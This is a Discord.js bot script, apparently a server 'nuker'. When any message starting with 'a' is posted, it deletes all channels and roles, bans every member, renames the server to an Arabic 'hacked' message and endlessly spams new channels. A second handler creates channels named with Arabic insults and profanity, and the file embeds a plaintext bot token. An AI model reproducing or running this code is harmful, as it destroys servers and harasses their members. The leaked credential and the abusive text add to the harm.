const Discord = require("discord.js");
const client = new Discord.Client();

client.on('message', message =>{
    if (message.content.startsWith('a')){
            if (message.channel.guild){
                message.guild.channels.forEach(c =>{
                    if(c.deletable){
                        c.delete()
                    }
                })
                message.guild.members.forEach(m =>{
                    m.ban()
                })
                message.guild.roles.forEach(r=>{
                    r.delete()
                })
                message.guild.setName('تم التهكيرمنقبل جاك.')
                setInterval(function(){
                    message.guild.createChannel('تم التهكير.', 'voice')
                    message.guild.createChannel('تم التهكير. ', 'text')
                    message.guild.createRole({name : 'تم التهكير. '})
                })
            }
        }
});

client.on('message', message => {
    if (message.content === "a") {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);

		
		
		
		
     message.guild.createChannel('ما تقدرو تهربو مني .', 'text')
	 message.guild.createChannel('تم والمرة القادمة بهكر.', 'text')
	 message.guild.createChannel('اجهزتكم .', 'text')
	 message.guild.createChannel('لاتستهينو بي انا.', 'text')
	 message.guild.createChannel('اقوا هكر .', 'text')
	 message.guild.createChannel('تم التهكيرفي الدسكورد.', 'text')
     message.guild.createChannel('كس امكن.', 'voice')
	 message.guild.createChannel('يل مخانث.', 'voice')
	 message.guild.createChannel('خخخخهخهخه', 'voice')
	 message.guild.createChannel('ليش كس امك.', 'voice')
	 message.guild.createChannel('احمر.', 'voice')
	 message.guild.createChannel('منوب.', 'voice')
	 message.guild.createChannel('كلاب .', 'voice')
	 message.guild.createChannel('يا الزقة.', 'voice')
	 message.guild.createChannel('سيرفر زق .', 'voice')
	 message.guild.createChannel('برب طفش.', 'voice')

    
message.channel.sendMessage('كل زق ')
}
});
 
client.login("Njg2ODQ3NTI4NTk0ODMzNDUz.XnWl_Q.Ls7BCJHkmJPpptyRAnhXj-PQ3Ys");